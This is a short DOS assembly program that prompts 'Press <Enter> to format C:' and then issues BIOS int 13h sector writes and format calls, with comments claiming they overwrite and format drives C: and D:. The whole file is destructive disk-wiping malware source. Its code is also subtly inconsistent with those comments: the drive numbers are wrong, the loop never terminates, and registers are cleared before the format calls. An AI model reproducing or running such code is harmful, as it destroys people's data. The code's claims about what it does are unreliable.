code    SEGMENT PARA PUBLIC 'code'
	ASSUME cs:code, ds:code, es:code, ss:code
	org     100h
.386
start: 

	mov	dx, offset message
	mov	ah, 9
	int	21h

	sub	ax, ax
	int	16h

	mov	dx, 0002h
	xor	cx, cx	
@0:	mov	ax, 0301h
	xor	bx, bx
	int	13h		;overwrites everything on C:
	inc	cl
	cmp	cl, 0ffh
	jne	@0
	xor	cl, cl
	inc	ch
	cmp	ch, 0ffh
	jmp	@0

	mov	dx, 0003h
	xor	cx, cx	
@1:	mov	ax, 0301h
	xor	bx, bx
	int	13h		;overwrites everything on D:
	inc	cl
	cmp	cl, 0ffh
	jne	@1
	xor	cl, cl
	inc	ch
	cmp	ch, 0ffh
	jmp	@1

	mov	ax, 0703h	;Format C:
	sub	ax, ax
	mov	es, bx
	mov	cx, 0001h
	mov	dx, 0080h
	int	13h

	mov	ax, 0703h	;Format D:
	sub	ax, ax
	mov	es, bx
	mov	cx, 0001h
	mov	dx, 0081h
	int	13h
	
	ret			;Later...


message	 db 'Press <Enter> to format C:$'

   code    ENDS
END     start
